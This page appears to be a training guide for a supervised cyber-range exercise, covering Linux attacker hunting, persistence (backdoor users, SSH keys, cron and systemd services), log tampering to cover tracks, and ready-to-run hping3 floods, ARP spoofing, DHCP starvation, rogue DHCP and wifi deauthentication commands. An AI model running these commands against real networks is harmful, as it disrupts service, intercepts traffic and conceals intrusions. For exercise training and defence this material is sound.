---
layout: default
title: Cyberus
---
# Cyberus
**Focus**: Network denial and disruption

**Skill**: Disconnect or degrade hostile systems

**Activity**: Identify attackers and remove them from the systems and network

<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/cyberus1.png' | relative_url }}" alt="Cyberus Logo" style="max-width: 80%; height: auto;">
</div>


**Goal**: Own the box, remove others, and maintain access

Winning is not about flooding the network — it is about:
- finding other players
- removing their access
- securing your own persistence
- controlling the system over time

---

# Recon

Once you get into a system, you should see if you are alone in the system

## Identify your system

<div class="terminal"> ip a </div>
<div class="terminal"> hostname -I </div>

Find routes and gateway

<div class="terminal"> ip r </div>

View active network connections

<div class="terminal"> ss -tulpn </div>
<div class="terminal"> netstat -tulpn </div>

**What to look for**
- Unknown listening services
- Suspicious ports
- Reverse shells

View live traffic:

<div class="terminal"> sudo wireshark </div>

start a capture > go to 'statistics' > 'conversations' > 'ip4'

or: 
<div class="terminal"> sudo tcpdump -i &lt;interface&gt; </div>
<div class="terminal"> sudo iftop -i &lt;interface&gt; </div>

**What to look for**
- Repeated connections from same IP
- c2 outbound traffic (ssh telnet traffic)

---

## Who is logged in and from where?

<div class="terminal"> who </div>
<div class="terminal"> w </div>
<div class="terminal"> last </div>

<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/who_w_last.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
</div>

**What to look for**
- Unknown users
- Multiple sessions

<div class="terminal"> tail /var/log/auth.log </div>

or open a terminal and monitor the file live

<div class="terminal"> sudo tail -f /var/log/auth.log </div>

or cover your tracks with: 

<div class="terminal"> sudo nano /var/log/auth.log </div>

find your ip address and delete the line (or change it so they chase their tail)

<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/authlog.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
</div>

---
# Establish Persistence 

## Add a new user, add the user to the sudoer file and establish ssh connection

<div class="terminal"> adduser <username> </div>
<div class="terminal"> sudo usermod -aG sudo <username> </div>

## Add telnet services and establish a telnet connection

<div class="terminal"> sudo apt update && sudo apt install telnetd -y && sudo apt install openbsd-inetd -y </div>

<div class="terminal"> sudo apt update && sudo apt install telnet -y </div>

use Portalord to establish a reverse ssh tunnel


---

# Process Hunting & Removal

## View running processes

<div class="terminal"> ps aux </div>
notice the PID is the second column:
<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/psaux.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
</div>
or look for specific processes

<div class="terminal"> ps aux | grep -E 'ssh|tel'</div>

<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/psaux_grepE.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
</div>


<div class="terminal"> top </div>

**What to look for**
- Unknown scripts
- Reverse shells (bash, nc, python)
- High CPU usage

---

## Kill malicious processes

<div class="terminal"> sudo kill -9 &lt;pid&gt; </div>
<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/kill-9.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
  <img src="{{ 'classes/cyberus/images/connectionclosed.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
</div>

<div class="terminal"> sudo pkill -f &lt;process_name&gt; </div>

**Tip**
- Attackers often restart processes → combine with persistence removal

---

# SSH Control

## Check active sessions

<div class="terminal"> who </div>

identify the user that is not your IP

<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/whopsaux.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
</div>

kill the process assocaiated with that session
<div class="terminal"> sudo kill -9 &lt;PID&gt; </div>
Goodnight ubuntu@pts/2: process 3583

<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/sshclosed.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
</div>


## Kill user sessions (if you are using another user on the sudoer file)

<div class="terminal"> sudo pkill -u &lt;username&gt; </div>

---

## Add your ssh key to the target
on your kali: 
<div class="terminal"> ssh-keygen -t rsa -b 2048</div>
<div class="terminal"> cat ~/.ssh/id_rsa.pub</div>

on the target system:

<div class="terminal"> sudo nano ~/.ssh/authorized_keys </div>

Paste your public key.

<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/sshkeypaste.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
</div>
---

## Secure SSH access

Authorized keys location:

<div class="terminal"> ~/.ssh/authorized_keys </div>

System-wide keys:

<div class="terminal"> /home/*/.ssh/authorized_keys </div>

---

## Remove attacker access
- Delete unknown keys
- Remove unknown users (Careful not to remove cyber.org range users

---

# User Control

## List users

<div class="terminal"> cat /etc/passwd </div>

or just list usernames

<div class="terminal"> cut -d: -f1 /etc/passwd </div>

---

## Change passwords

<div class="terminal"> sudo passwd &lt;username&gt; </div>

---

## Remove attacker users

<div class="terminal"> sudo userdel -r &lt;username&gt; </div>

---

# Firewall Control (UFW)

Enable firewall
<div class="terminal"> ssudo ufw default allow incoming </div>
<div class="terminal"> sudo ufw enable </div>


Allow your IP

<div class="terminal"> sudo ufw allow from &lt;your_ip&gt; </div>

Block attacker IP

<div class="terminal"> sudo ufw deny from &lt;attacker_ip&gt; </div>

View rules

<div class="terminal"> sudo ufw status numbered </div>

---

## Remove rule

<div class="terminal"> sudo ufw delete &lt;rule_number&gt; </div>

---


# Persistence (Stay on the Box)

Attackers WILL come back unless you remove persistence.

---

## Cron Jobs (Scheduled Backdoors)

### View cron jobs

<div class="terminal"> crontab -l </div>

System-wide:

<div class="terminal"> ls /etc/cron* </div>

---

### Remove malicious cron

<div class="terminal"> crontab -r </div>

Or edit:

<div class="terminal"> crontab -e </div>

---

### Create persistence

Example (runs every minute):

<div class="terminal"> crontab -e </div>

Add:
<pre>
* * * * * /path/to/script.sh
</pre>

---

## Systemd Services (Stronger Persistence)

### List services

<div class="terminal"> systemctl list-units --type=service </div>

---

### Find suspicious services

Look for:
- unknown names
- scripts running from /tmp or home directories

---

### Stop and disable service

<div class="terminal"> sudo systemctl stop &lt;service&gt; </div>
<div class="terminal"> sudo systemctl disable &lt;service&gt; </div>

---

### Create your own service

Create file:

<div class="terminal"> sudo nano /etc/systemd/system/cyberus.service </div>

Example:
<pre>
[Unit]
Description=Cyberus Persistence

[Service]
ExecStart=/bin/bash /home/user/script.sh
Restart=always

[Install]
WantedBy=multi-user.target
</pre>

Enable:

<div class="terminal"> sudo systemctl daemon-reexec </div>
<div class="terminal"> sudo systemctl enable cyberus </div>
<div class="terminal"> sudo systemctl start cyberus </div>

---

# Quick Attack / Harassment Tools (SECONDARY)

These do NOT win the box, but can disrupt others.

---

## hping3 (Target specific systems)

<div class="terminal"> sudo hping3 -S -p 22 &lt;target_ip&gt; </div>

---

## ICMP Flood (basic pressure)

<div class="terminal"> sudo ping -f &lt;target_ip&gt; </div>

---

## Observe impact

Use:

<div class="terminal"> iftop </div>
<div class="terminal"> tcpdump </div>

---

**Important**
- These slow systems down
- They do NOT replace system control
- Use them to distract while taking control

---

## Find open files and network usage

<div class="terminal"> sudo lsof -i </div>

This lists:

Processes using network connections

Which ports they’re using

Who owns them
Due to network configurations, this does not work on the cyber.org range:
<div style="text-align: center;">
  <img src="{{ 'classes/cyberus/images/lsof-i.png' | relative_url }}" alt="" style="max-width: 80%; height: auto;">
</div>
---

# Denial of Service

## ICMP Flood
Install tool (if needed):

<div class="terminal"> sudo apt install -y hping3 </div>

Fast ping flood:

<div class="terminal"> sudo ping -f &lt;target_ip&gt; </div>

Large packet flood:

<div class="terminal"> sudo ping -f -s 65000 &lt;target_ip&gt; </div>

Using hping3:

<div class="terminal"> sudo hping3 --flood --icmp &lt;target_ip&gt; </div>

**Flag Notes**
- `-f` → sends packets as fast as possible
- `-s` → changes packet size
- `--icmp` → chooses ICMP protocol
- `--flood` → removes delay between packets

Try changing:
- packet size
- protocol
- target

---

## SYN Flood
Flood a service port (example: SSH):

<div class="terminal"> sudo hping3 -S --flood -p 22 &lt;target_ip&gt; </div>

More aggressive:

<div class="terminal"> sudo hping3 -S --flood --rand-source -p 22 &lt;target_ip&gt; </div>

**Flag Notes**
- `-S` → sends SYN packets (start of TCP connection)
- `-p` → chooses port
- `--rand-source` → spoofs source IP
- `--flood` → sends continuously

Try changing:
- port number
- adding or removing spoofing

---

## UDP Flood
Flood a UDP port:

<div class="terminal"> sudo hping3 --flood --udp -p 53 &lt;target_ip&gt; </div>

**Flag Notes**
- `--udp` → uses UDP protocol
- `-p` → target port
- `--flood` → continuous send

Try changing:
- ports commonly used by services

---

## MAC Flood (Switch exhaustion)
Install tool:

<div class="terminal"> sudo apt install -y dsniff </div>

Run:

<div class="terminal"> sudo macof -i &lt;interface&gt; </div>

**Flag Notes**
- `-i` → selects network interface
- Tool generates large numbers of fake MAC addresses

Try changing:
- interface

---

# ARP

## ARP Spoofing (Disconnect victim from gateway)
Install tools:

<div class="terminal"> sudo apt install -y dsniff ettercap bettercap </div>

Find gateway:

<div class="terminal"> ip r </div>

Terminal 1:

<div class="terminal"> sudo arpspoof -i &lt;interface&gt; -t &lt;target_ip&gt; &lt;gateway_ip&gt; </div>

Terminal 2:

<div class="terminal"> sudo arpspoof -i &lt;interface&gt; -t &lt;gateway_ip&gt; &lt;target_ip&gt; </div>

**Flag Notes**
- `-i` → interface used
- `-t` → target being poisoned
- Last IP → system you are impersonating

What is happening:
1. Tell victim you are gateway
2. Tell gateway you are victim
3. Traffic flows through attacker

---

## Ettercap ARP Poisoning (GUI)
Start:

<div class="terminal"> sudo ettercap -G </div>

Steps:
1. Select interface
2. Scan for hosts
3. Add target 1 = victim
4. Add target 2 = gateway
5. MitM → ARP poisoning → Start

**What this does**
- Automates the same steps as arpspoof
- Adds packet inspection capability

---

## Gratuitous ARP Flood
Using nemesis:

<div class="terminal"> sudo apt install -y nemesis </div>

<div class="terminal"> sudo nemesis arp -v -d &lt;target_ip&gt; -S &lt;fake_ip&gt; -h &lt;fake_mac&gt; </div>

**Flag Notes**
- `-d` → destination
- `-S` → spoofed sender IP
- `-h` → spoofed MAC
- `-v` → verbose output

Try changing:
- spoofed values

---

# DHCP

## DHCP Starvation (Consume leases)
Install tool:

<div class="terminal"> sudo apt install -y yersinia </div>

Run interactive mode:

<div class="terminal"> sudo yersinia -G </div>

Steps:
1. Select DHCP
2. Launch starvation attack

**What is happening**
- Many fake clients request addresses
- Pool runs out
- Real clients cannot obtain IP

---

## Rogue DHCP Server (dnsmasq)
Install:

<div class="terminal"> sudo apt install -y dnsmasq </div>

Example minimal config:
Edit:

<div class="terminal"> sudo nano /etc/dnsmasq.conf </div>

Add:
<pre>
interface=&lt;interface&gt;
dhcp-range=192.168.1.50,192.168.1.150,12h
dhcp-option=3,&lt;fake_gateway_ip&gt;
dhcp-option=6,&lt;fake_dns_ip&gt;
</pre>

Restart:

<div class="terminal"> sudo systemctl restart dnsmasq </div>

**What the options mean**
- `dhcp-range` → addresses handed out
- `option 3` → gateway given to clients
- `option 6` → DNS server given to clients

---

# Deauthentication

## Monitor wireless interfaces

<div class="terminal"> iwconfig </div>

Enable monitor mode:

<div class="terminal"> sudo airmon-ng start wlan0 </div>

**What this does**
- Puts adapter into packet capture mode

---

## Find targets

<div class="terminal"> sudo airodump-ng wlan0mon </div>

Record:
- BSSID
- Channel
- Client MAC

**What to look for**
- Which AP is active
- Which clients are connected

---

## Deauth a client

<div class="terminal"> sudo aireplay-ng --deauth 20 -a &lt;bssid&gt; -c &lt;client_mac&gt; wlan0mon </div>

Deauth entire AP:

<div class="terminal"> sudo aireplay-ng --deauth 50 -a &lt;bssid&gt; wlan0mon </div>

**Flag Notes**
- `--deauth` → number of packets sent
- `-a` → access point
- `-c` → client

Try changing:
- packet count

---

## Alternative: mdk4
Install:

<div class="terminal"> sudo apt install -y mdk4 </div>

Run:

<div class="terminal"> sudo mdk4 wlan0mon d -B &lt;bssid&gt; </div>

**Flag Notes**
- `d` → deauth mode
- `-B` → target AP

---

# Deauth && Handshake Capture

## Capture handshake
Start capture:

<div class="terminal"> sudo airodump-ng -c &lt;channel&gt; --bssid &lt;bssid&gt; -w capture wlan0mon </div>

Leave running.

**Flag Notes**
- `-c` → channel
- `--bssid` → target AP
- `-w` → output file

---

## Force reconnect to capture handshake

<div class="terminal"> sudo aireplay-ng --deauth 10 -a &lt;bssid&gt; wlan0mon </div>

Watch for:
WPA handshake: &lt;bssid&gt;

---

## Verify capture
Files created:
<pre>
capture.cap
capture.csv
</pre>

Open:

<div class="terminal"> wireshark capture.cap </div>

**What you are verifying**
- Handshake packets present
- Correct network

---

# Quick Recon Commands
Find interface:

<div class="terminal"> ip addr </div>

Find gateway:

<div class="terminal"> ip r </div>

Find active traffic:

<div class="terminal"> sudo iftop -i &lt;interface&gt; </div>

Watch packets:

<div class="terminal"> sudo tcpdump -i &lt;interface&gt; </div>

**What these tell you**
- Interfaces
- Routes
- Traffic patterns
- Packet details

# grep quick commands

# Grep Cheat Sheet (Cyberus)

### Use grep to quickly find attackers, services, and suspicious activity.

---

Basic Search

<div class="terminal"> grep "text" file </div>


Multiple Keywords

<div class="terminal"> grep -E 'sshd|telnet|nc|bash' file </div>


Ignore Case

<div class="terminal"> grep -i "failed" /var/log/auth.log </div>


Show Line Numbers
<div class="terminal"> grep -n "Accepted" /var/log/auth.log </div>

### Common Log Hunting

Find logins
<div class="terminal"> sudo grep "Accepted" /var/log/auth.log </div>

Find failed attempts
<div class="terminal"> sudo grep "Failed" /var/log/auth.log </div>

Find attacker IPs
<div class="terminal"> sudo grep -E 'Accepted|Failed' /var/log/auth.log </div>


### Process Hunting

Find suspicious processes
<div class="terminal"> ps aux | grep -E 'nc|bash|python|ssh' </div>

Remove grep from results
<div class="terminal"> ps aux | grep -E 'nc|bash|python|ssh' | grep -v grep </div>

### Network Hunting

Find services
<div class="terminal"> sudo lsof -i | grep -E 'LISTEN|ESTABLISHED' </div>

Look for backdoors
<div class="terminal"> sudo lsof -i | grep -E 'nc|bash|python' </div>

Real-Time Log Monitoring

<div class="terminal"> sudo tail -f /var/log/auth.log | grep -E 'Accepted|Failed' </div>

---

## Key Idea

- grep helps you **filter noise**
- combine it with:
  - logs → find attackers
  - ps → find processes
  - lsof → find connections


---

# Rules of Engagement
- Only attack assigned targets
- Stop attacks when instructed
- Restore systems after exercise

---
